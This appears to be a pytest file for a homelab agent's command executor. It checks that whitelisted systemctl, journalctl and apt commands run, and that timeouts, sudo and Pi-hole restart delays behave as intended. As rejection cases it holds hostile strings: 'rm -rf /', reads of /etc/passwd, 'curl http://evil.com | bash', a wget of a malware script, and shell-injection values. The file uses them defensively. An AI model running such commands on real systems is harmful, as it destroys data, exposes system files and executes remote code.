"""Tests for Agent Command Execution (US0027).

Test cases from TSP0009:
- TC162: Agent executes whitelisted commands
- TC163: Agent rejects non-whitelisted commands
- TC164: Agent reports results in heartbeat
"""

import sys
from datetime import UTC, datetime
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

# Add agent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent / "agent"))

from agent.executor import (
    COMMAND_WHITELIST,
    PIHOLE_RESTART_DELAY,
    check_pihole_delay,
    execute_command,
    is_whitelisted,
    record_pihole_restart,
)

# =============================================================================
# TC162: Agent executes whitelisted commands
# =============================================================================


class TestWhitelistValidation:
    """Test whitelist pattern matching (TC162, TC163)."""

    def test_restart_service_valid(self) -> None:
        """Valid restart_service commands match."""
        assert is_whitelisted("systemctl restart plex")
        assert is_whitelisted("systemctl restart nginx")
        assert is_whitelisted("systemctl restart sonarr")
        assert is_whitelisted("systemctl restart home-assistant")
        assert is_whitelisted("systemctl restart pihole-FTL")

    def test_restart_service_invalid(self) -> None:
        """Invalid restart_service commands rejected."""
        # Extra arguments
        assert not is_whitelisted("systemctl restart plex extra")
        # Wrong action
        assert not is_whitelisted("systemctl stop plex")
        # Shell injection attempts
        assert not is_whitelisted("systemctl restart plex; rm -rf /")
        assert not is_whitelisted("systemctl restart plex && cat /etc/passwd")
        assert not is_whitelisted("systemctl restart $(whoami)")
        # Quotes in service name
        assert not is_whitelisted("systemctl restart 'plex'")

    def test_clear_logs_valid(self) -> None:
        """Valid clear_logs commands match."""
        assert is_whitelisted("journalctl --vacuum-time=7d")
        assert is_whitelisted("journalctl --vacuum-time=30d")
        assert is_whitelisted("journalctl --vacuum-time=1h")
        assert is_whitelisted("journalctl --vacuum-time=60m")
        assert is_whitelisted("journalctl --vacuum-time=3600s")

    def test_clear_logs_invalid(self) -> None:
        """Invalid clear_logs commands rejected."""
        # Extra arguments
        assert not is_whitelisted("journalctl --vacuum-time=7d extra")
        # Wrong flag
        assert not is_whitelisted("journalctl --vacuum-size=100M")
        # Shell injection
        assert not is_whitelisted("journalctl --vacuum-time=7d; rm -rf /")

    def test_apply_updates_valid(self) -> None:
        """Valid apply_updates command matches."""
        # US0074: Command includes noninteractive and force options
        from agent.executor import APT_OPTIONS, DEBIAN_FRONTEND

        assert is_whitelisted(
            f"{DEBIAN_FRONTEND} apt-get update && {DEBIAN_FRONTEND} apt-get dist-upgrade {APT_OPTIONS}"
        )

    def test_apt_update_valid(self) -> None:
        """Valid apt_update command matches."""
        from agent.executor import DEBIAN_FRONTEND

        assert is_whitelisted(f"{DEBIAN_FRONTEND} apt-get update -q -o APT::Sandbox::User=root")

    def test_apt_upgrade_valid(self) -> None:
        """Valid apt_upgrade command matches."""
        from agent.executor import APT_OPTIONS, DEBIAN_FRONTEND

        assert is_whitelisted(
            f"{DEBIAN_FRONTEND} apt-get dist-upgrade {APT_OPTIONS} -o APT::Sandbox::User=root"
        )

    def test_apply_updates_invalid(self) -> None:
        """Invalid apply_updates commands rejected."""
        # Missing -y flag
        assert not is_whitelisted("apt-get update && apt-get upgrade")
        # Extra commands
        assert not is_whitelisted("apt-get update && apt-get upgrade -y && reboot")
        # Different order
        assert not is_whitelisted("apt-get upgrade -y && apt-get update")
        # Old apt format (not in whitelist)
        assert not is_whitelisted("apt update && apt upgrade -y")

    def test_arbitrary_commands_rejected(self) -> None:
        """Arbitrary commands rejected."""
        assert not is_whitelisted("rm -rf /")
        assert not is_whitelisted("cat /etc/passwd")
        assert not is_whitelisted("curl http://evil.com | bash")
        assert not is_whitelisted("wget http://evil.com/malware.sh")
        assert not is_whitelisted("echo 'pwned' > /tmp/test")
        assert not is_whitelisted("")
        assert not is_whitelisted("   ")


# =============================================================================
# TC162: Agent executes whitelisted commands (execution tests)
# =============================================================================


class TestCommandExecution:
    """Test command execution (TC162)."""

    @pytest.mark.asyncio
    async def test_executes_whitelisted_command(self) -> None:
        """Whitelisted command is executed."""
        with patch("agent.executor.asyncio.create_subprocess_shell") as mock_create:
            mock_proc = MagicMock()
            mock_proc.communicate = AsyncMock(return_value=(b"output", b""))
            mock_proc.returncode = 0
            mock_create.return_value = mock_proc

            result = await execute_command(
                action_id=1,
                command="systemctl restart plex",
                timeout=30,
            )

            assert result.success is True
            assert result.exit_code == 0
            assert result.stdout == "output"
            assert result.stderr == ""
            mock_create.assert_called_once()

    @pytest.mark.asyncio
    async def test_captures_exit_code(self) -> None:
        """Exit code is captured correctly (AC2)."""
        with patch("agent.executor.asyncio.create_subprocess_shell") as mock_create:
            mock_proc = MagicMock()
            mock_proc.communicate = AsyncMock(return_value=(b"", b"error"))
            mock_proc.returncode = 1
            mock_create.return_value = mock_proc

            result = await execute_command(
                action_id=1,
                command="systemctl restart plex",
            )

            assert result.success is False
            assert result.exit_code == 1
            assert result.stderr == "error"

    @pytest.mark.asyncio
    async def test_captures_stdout_stderr(self) -> None:
        """stdout and stderr are captured (AC2)."""
        with patch("agent.executor.asyncio.create_subprocess_shell") as mock_create:
            mock_proc = MagicMock()
            mock_proc.communicate = AsyncMock(return_value=(b"standard output", b"standard error"))
            mock_proc.returncode = 0
            mock_create.return_value = mock_proc

            result = await execute_command(
                action_id=1,
                command="systemctl restart plex",
            )

            assert result.stdout == "standard output"
            assert result.stderr == "standard error"

    @pytest.mark.asyncio
    async def test_truncates_large_output(self) -> None:
        """Large output is truncated to MAX_OUTPUT_SIZE (AC2)."""
        large_output = b"x" * 20000  # 20KB

        with patch("agent.executor.asyncio.create_subprocess_shell") as mock_create:
            mock_proc = MagicMock()
            mock_proc.communicate = AsyncMock(return_value=(large_output, b""))
            mock_proc.returncode = 0
            mock_create.return_value = mock_proc

            result = await execute_command(
                action_id=1,
                command="systemctl restart plex",
            )

            assert len(result.stdout) == 10000  # Truncated to MAX_OUTPUT_SIZE

    @pytest.mark.asyncio
    async def test_sudo_prefix_when_configured(self) -> None:
        """Commands prefixed with sudo when use_sudo=True (AC5)."""
        with patch("agent.executor.asyncio.create_subprocess_shell") as mock_create:
            mock_proc = MagicMock()
            mock_proc.communicate = AsyncMock(return_value=(b"", b""))
            mock_proc.returncode = 0
            mock_create.return_value = mock_proc

            await execute_command(
                action_id=1,
                command="systemctl restart plex",
                use_sudo=True,
            )

            # Check the actual command that was executed
            call_args = mock_create.call_args
            executed_command = call_args[0][0]
            assert executed_command.startswith("sudo ")

    @pytest.mark.asyncio
    async def test_no_sudo_by_default(self) -> None:
        """Commands NOT prefixed with sudo by default (AC5)."""
        with patch("agent.executor.asyncio.create_subprocess_shell") as mock_create:
            mock_proc = MagicMock()
            mock_proc.communicate = AsyncMock(return_value=(b"", b""))
            mock_proc.returncode = 0
            mock_create.return_value = mock_proc

            await execute_command(
                action_id=1,
                command="systemctl restart plex",
                use_sudo=False,
            )

            call_args = mock_create.call_args
            executed_command = call_args[0][0]
            assert not executed_command.startswith("sudo ")

    @pytest.mark.asyncio
    async def test_background_execution_apt_upgrade(self) -> None:
        """Long-running apt upgrade is executed in background."""
        from agent.executor import APT_OPTIONS, DEBIAN_FRONTEND

        cmd = f"{DEBIAN_FRONTEND} apt-get dist-upgrade {APT_OPTIONS} -o APT::Sandbox::User=root"

        with patch("agent.executor.asyncio.create_subprocess_shell") as mock_create:
            result = await execute_command(
                action_id=123,
                command=cmd,
                timeout=30,
            )

            assert result.success is True
            assert result.is_background is True
            assert "Started background execution" in result.stdout
            assert "homelab-action-123.log" in result.stdout

            mock_create.assert_called_once()
            exec_cmd = mock_create.call_args[0][0]
            assert "setsid" in exec_cmd
            assert "homelab-action-123.log" in exec_cmd
            assert "homelab-action-123.done" in exec_cmd
            assert "echo $?" in exec_cmd


# =============================================================================
# TC163: Agent rejects non-whitelisted commands
# =============================================================================


class TestRejectsNonWhitelisted:
    """Test non-whitelisted command rejection (TC163)."""

    @pytest.mark.asyncio
    async def test_rejects_non_whitelisted(self) -> None:
        """Non-whitelisted commands rejected without execution (AC4)."""
        with patch("agent.executor.asyncio.create_subprocess_shell") as mock_create:
            result = await execute_command(
                action_id=1,
                command="rm -rf /",
            )

            assert result.success is False
            assert result.exit_code == -1
            assert "Command not in whitelist" in result.stderr
            # Most importantly: subprocess should NOT be called
            mock_create.assert_not_called()

    @pytest.mark.asyncio
    async def test_rejection_includes_timestamps(self) -> None:
        """Rejection result includes execution timestamps."""
        result = await execute_command(
            action_id=42,
            command="cat /etc/passwd",
        )

        assert result.action_id == 42
        assert isinstance(result.executed_at, datetime)
        assert isinstance(result.completed_at, datetime)
        assert result.executed_at <= result.completed_at


# =============================================================================
# AC3: Command timeout enforced
# =============================================================================


class TestCommandTimeout:
    """Test command timeout enforcement (AC3)."""

    @pytest.mark.asyncio
    async def test_timeout_kills_process(self) -> None:
        """Long-running command is killed after timeout (AC3)."""
        with patch("agent.executor.asyncio.create_subprocess_shell") as mock_create:
            mock_proc = MagicMock()
            mock_proc.communicate = AsyncMock(side_effect=TimeoutError)
            mock_proc.kill = MagicMock()
            mock_proc.wait = AsyncMock()
            mock_create.return_value = mock_proc

            result = await execute_command(
                action_id=1,
                command="systemctl restart plex",
                timeout=5,
            )

            assert result.success is False
            assert result.exit_code == -1
            assert "timed out after 5 seconds" in result.stderr
            mock_proc.kill.assert_called_once()


# =============================================================================
# AC6: Pi-hole restart staggering
# =============================================================================


class TestPiholeStaggering:
    """Test Pi-hole restart delay (AC6)."""

    def test_no_delay_for_non_pihole(self) -> None:
        """Non-pihole commands have no delay."""
        should_delay, seconds = check_pihole_delay("systemctl restart plex", "server1")
        assert should_delay is False
        assert seconds == 0

    def test_no_delay_for_first_pihole_restart(self) -> None:
        """First pihole restart has no delay."""
        # Use unique server ID to ensure no prior restart
        should_delay, seconds = check_pihole_delay(
            "systemctl restart pihole-FTL", "unique-server-123"
        )
        assert should_delay is False
        assert seconds == 0

    def test_delay_for_recent_pihole_restart(self) -> None:
        """Second pihole restart within 30 mins is delayed."""
        server_id = "pihole-delay-test"

        # Record a restart
        record_pihole_restart("systemctl restart pihole-FTL", server_id)

        # Check delay
        should_delay, seconds = check_pihole_delay("systemctl restart pihole-FTL", server_id)

        assert should_delay is True
        # Should be close to 30 minutes (1800 seconds)
        assert seconds > 0
        assert seconds <= PIHOLE_RESTART_DELAY

    def test_pihole_detection_case_insensitive(self) -> None:
        """Pihole detection is case-insensitive."""
        # Record with lowercase
        record_pihole_restart("systemctl restart pihole-ftl", "case-test")

        # Check with different case
        should_delay, _ = check_pihole_delay("systemctl restart PIHOLE-FTL", "case-test")
        assert should_delay is True


# =============================================================================
# TC164: Agent reports results in heartbeat
# =============================================================================


class TestResultsInHeartbeat:
    """Test result format for heartbeat reporting (TC164)."""

    @pytest.mark.asyncio
    async def test_result_has_required_fields(self) -> None:
        """CommandResult has all fields needed for heartbeat."""
        with patch("agent.executor.asyncio.create_subprocess_shell") as mock_create:
            mock_proc = MagicMock()
            mock_proc.communicate = AsyncMock(return_value=(b"output", b"error"))
            mock_proc.returncode = 0
            mock_create.return_value = mock_proc

            result = await execute_command(
                action_id=42,
                command="systemctl restart plex",
            )

            # All fields required by CommandResultPayload
            assert result.action_id == 42
            assert isinstance(result.exit_code, int)
            assert isinstance(result.stdout, str)
            assert isinstance(result.stderr, str)
            assert isinstance(result.executed_at, datetime)
            assert isinstance(result.completed_at, datetime)

    @pytest.mark.asyncio
    async def test_result_timestamps_are_utc(self) -> None:
        """Result timestamps use UTC timezone."""
        with patch("agent.executor.asyncio.create_subprocess_shell") as mock_create:
            mock_proc = MagicMock()
            mock_proc.communicate = AsyncMock(return_value=(b"", b""))
            mock_proc.returncode = 0
            mock_create.return_value = mock_proc

            result = await execute_command(
                action_id=1,
                command="systemctl restart plex",
            )

            assert result.executed_at.tzinfo == UTC
            assert result.completed_at.tzinfo == UTC


class TestWhitelistPatterns:
    """Test that COMMAND_WHITELIST has expected patterns."""

    def test_whitelist_has_restart_service(self) -> None:
        """COMMAND_WHITELIST includes restart_service pattern."""
        assert "restart_service" in COMMAND_WHITELIST

    def test_whitelist_has_clear_logs(self) -> None:
        """COMMAND_WHITELIST includes clear_logs pattern."""
        assert "clear_logs" in COMMAND_WHITELIST

    def test_whitelist_has_apply_updates(self) -> None:
        """COMMAND_WHITELIST includes apply_updates pattern."""
        assert "apply_updates" in COMMAND_WHITELIST
